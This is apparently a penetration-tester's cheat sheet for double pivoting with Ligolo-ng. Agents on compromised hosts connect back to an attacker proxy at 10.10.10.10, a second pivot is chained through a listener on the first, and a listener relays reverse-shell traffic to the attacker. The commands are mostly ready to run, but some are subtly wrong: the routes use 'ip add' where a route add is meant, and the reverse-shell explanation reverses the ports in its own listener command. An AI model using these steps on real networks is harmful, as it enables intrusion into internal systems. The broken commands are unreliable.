*Tips for stability*: `sudo ip link set tun0 mtu 1000`
## First Pivot  (10.10.10.15 / 152.20.20.60)
#### Create Interface
```shell
sudo ip tuntap add user vdarras mode tun ligolo
```
#### Set Up Interface
```shell
sudo ip link set ligolo up
```
#### Run Ligolo Proxy on Attacker Host (10.10.10.10)
```shell
sudo ./proxy -selfcert
```
#### Run Ligolo Agent on First Compromised Machine (10.10.10.15 / 152.20.20.60)
*Transfer file to target & give the right permissions to it*
```shell
./agent -connect 10.10.10.10:11601 -ignore-cert
```
#### Create Tunnel on Ligolo
```shell
ligolo-ng >> session # Choose session

>> start --tun ligolo
```
#### Add Route for Ligolo Interface
```shell
sudo ip add 152.20.20.0/24 dev ligolo
```

## Second Pivot  (152.20.20.13 / 175.162.10.12)
#### Create Interface
```shell
sudo ip tuntap add user vdarras mode tun ligolo-double
```
#### Set Up Interface
```shell
sudo ip link set ligolo-double up
```
#### Go on Ligolo Session and Add Listener on First Pivot
```shell
>> listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```
#### Run Ligolo Agent on Second Pivot (152.20.20.13 / 175.162.10.12)
**Important**: Here we connect back to the first pivot that listen and redirect traffic to the ligolo proxy.
```shell
./agent -connect 152.20.20.60:11601 -ignore-cert
```
#### Choose Session
```shell
>> session # Choose second session
>> 2
```
#### Add Route for ligolo-double Interface
```shell
sudo ip add 175.162.10.0/24 dev ligolo-double
```
#### Start Tunnel on Ligolo
```shell
>> start --tun ligolo-double
```

---
## Useful Ligolo Commands
#### Reverse Shell / File Tranfer
```shell
# Creates a listener on the machine where we're running the agent at port 1234  
# and redirects the traffic to port 4444 on our machine.  
# You can use other ports, of course.
>> session # Choose session in which you want the listener to be
>> listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
```
Everything sent to our agent to port 4444 will be redirected to our machine on port 1234.
#### List Listener
```shell
>> listener_list
```
#### Cleanup
```shell
ip link set ligolo down
ip link delete ligolo
OR
interface_delete --name ligolo
# Safely deletes the ligolo TUN interface from your machine.
```